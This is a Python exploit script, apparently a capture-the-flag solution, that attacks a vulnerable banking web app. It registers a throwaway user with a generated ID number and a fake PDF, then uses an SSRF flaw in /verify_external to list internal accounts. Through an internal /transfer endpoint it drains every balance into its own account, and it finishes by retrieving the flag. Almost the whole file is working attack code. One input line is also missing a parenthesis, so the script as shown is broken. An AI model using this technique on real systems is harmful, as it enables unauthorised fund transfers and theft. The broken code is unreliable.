import requests
import random
import string
import json
import re
from bs4 import BeautifulSoup

server = str(input("Introduce el nombre del servidor público: "))  # app_public.py
puerto = str(input("Introduce el puerto del servidor público (por defecto 80): ") or "80")
internal_server = str(input("Introduce el nombre del servidor interno: "))  # app_internal.py
puerto_interno = str(input("Introduce el puerto del servidor interno (por defecto 443): ") or "443"

nombre = input("Introduce el nombre de usuario: ")
password = input("Introduce la contraseña: ")

# Configuración
TARGET = f"http://{server}:{puerto}"
INTERNAL = f"http://{internal_server}:{puerto_interno}"
session = requests.Session()

# Mapa para calcular letra del DNI
DNI_LETTERS = "TRWAGMYFPDXBNJZSQVHLCKE"

def generar_dni():
    """Genera un DNI válido con letra de control"""
    num = random.randint(10000000, 99999999)
    letra = DNI_LETTERS[num % 23]
    return f"{num}{letra}"

def generar_pdf_fake(nombre="falso.pdf"):
    """Crea un PDF ficticio con contenido aleatorio >1KB"""
    with open(nombre, "wb") as f:
        contenido = ''.join(random.choices(string.ascii_letters + string.digits, k=2048))
        f.write(contenido.encode())
    return nombre

def registrar_usuario(dni, nombre, password, pdf_path):
    """Hace POST al /register con el formulario y el PDF generado"""
    url = f"{TARGET}/register"
    with open(pdf_path, "rb") as pdf_file:
        data = {
            "dni": dni,
            "fullname": nombre,
            "password": password
        }
        files = {
            "document": (pdf_path, pdf_file, "application/pdf")
        }
        r = session.post(url, data=data, files=files)
    print(f"[+] Registro enviado: {r.status_code}")
    return r.status_code == 200

def login_usuario(dni, password):
    """Hace login en /login con las credenciales"""
    url = f"{TARGET}/login"
    data = {
        "dni": dni,
        "password": password
    }
    r = session.post(url, data=data)
    print(f"[+] Login: {r.status_code}")
    return r.status_code == 200

def obtener_iban_personal():
    """Accede al /dashboard y extrae el IBAN desde el HTML"""
    r = session.get(f"{TARGET}/dashboard")
    match = re.search(r"IBAN: ([A-Z0-9]+)", r.text)
    if match:
        iban = match.group(1)
        print(f"[+] IBAN personal: {iban}")
        return iban
    print("[-] No se pudo obtener el IBAN personal")
    return None
def obtener_saldo():
    """Accede al /dashboard y extrae el saldo actual usando BeautifulSoup"""
    r = session.get(f"{TARGET}/dashboard")
    soup = BeautifulSoup(r.text, "html.parser")
    saldo_div = soup.find("div", class_="text-3xl font-semibold")
    if saldo_div:
        saldo = saldo_div.get_text(strip=True).replace("€", "").strip()
        print(f"[+] Saldo actual: {saldo} €")
        return saldo
    print("[-] No se pudo obtener el saldo actual")
    return None

def fetch_ssrf(url_objetivo):
    """Envia un SSRF contra /verify_external con la URL objetivo"""
    url = f"{TARGET}/verify_external"
    data = {
        "url": url_objetivo
    }
    r = session.post(url, data=data)
    # print(f"[+] SSRF fetch {url_objetivo} -> {r.status_code}")
    return r.text

def extraer_ibans_y_transferir_con_ssrf(iban_victima):
    """Exploita SSRF para listar cuentas e intenta transferir 1€ desde cada una a la cuenta propia"""
    # Paso 1: Obtener contenido de /founds por SSRF
    
    raw = fetch_ssrf(f"{INTERNAL}/founds")
    # raw tiene que ser raw pero solamente la parte de <pre> àrseada con BeautifulSoup
    soup = BeautifulSoup(raw, "html.parser")
    pre = soup.find("pre")
    if not pre:
        print("[-] No se encontró la etiqueta <pre> en la respuesta SSRF")
        return
    raw = pre.get_text(strip=True)
    #esta con htmlentities, así que hay que decodificarlo
    raw = raw.encode('latin1').decode('utf-8')     
    
    
    # Arreglo bruto del JSON roto
    # json_sano = raw.split('[')[-1].rsplit(']', 1)[0] + "]"
    # json_sano = "[" + json_sano
    # raw = '[' + raw + "]"
    try:
        cuentas = json.loads(raw)
    except Exception as e:
        print("[-] Error procesando JSON:", e)
        return
    # print(raw)
    
    # Paso 2: Transferir desde cada cuenta hacia la nuestra
    for cuenta in cuentas:
        from_iban = cuenta
        if not from_iban or from_iban == iban_victima:
            continue
        if from_iban.get('balance') < 1:
            continue
        ssrf_url = f"{INTERNAL}/transfer?from={from_iban.get('iban')}&to={iban_victima}&amount={from_iban.get('balance')}"
        respuesta = fetch_ssrf(ssrf_url)
        try:
            # La respuesta puede ser HTML, intenta extraer solo el texto relevante
            soup_resp = BeautifulSoup(respuesta, "html.parser")
            pre_resp = soup_resp.find("pre")
            if pre_resp:
                resp_text = pre_resp.get_text(strip=True)
                # print(f"[+] Transferencia desde {from_iban.get('iban')} hacia {iban_victima}: {resp_text[:100]}...")
            else:
                resp_text = respuesta.strip()
                # print(f"[+] Transferencia desde {from_iban.get('iban')} hacia {iban_victima} de {resp_text.get("amount")} estado de transferencia: {resp_text.get("status")}") #: {resp_text[:100]}..."
        except Exception as e:
            # print(f"[-] Error parseando respuesta de transferencia: {e}")
            pass
    
    """
    ssrf_url = f"{INTERNAL}/transfer_all?to_iban={iban_victima}"
    respuesta = fetch_ssrf(ssrf_url)
    """

# ===================== EJECUCIÓN ==========================

dni = generar_dni()
pdf = generar_pdf_fake()

print(f"[.] Registrando con DNI: {dni}")

if registrar_usuario(dni, nombre, password, pdf):
    if login_usuario(dni, password):
        mi_iban = obtener_iban_personal()
        if mi_iban:
            obtener_saldo()
            extraer_ibans_y_transferir_con_ssrf(mi_iban)
            print("[+] Nombre:", nombre)
            print("[+] Contraseña:", password)
            obtener_saldo()
            # finalmente accede a /withdraw y printa lo que sale en <div class="bg-green-100 text-green-700 p-4 rounded mb-4">¡Felicidades! flag{hasVulneradoElBancoConSSRF}</div>
            r = session.post(f"{TARGET}/withdraw")
            soup = BeautifulSoup(r.text, "html.parser")
            div_flag = soup.find("div", class_="bg-green-100 text-green-700 p-4 rounded mb-4")
            if div_flag:
                flag = div_flag.get_text(strip=True)    
                print(f"[+] Bandera obtenida: {flag}")
            else:
                print("[-] No se encontró la bandera en la respuesta de /withdraw")
            print("[+] Transferencias realizadas con éxito.")
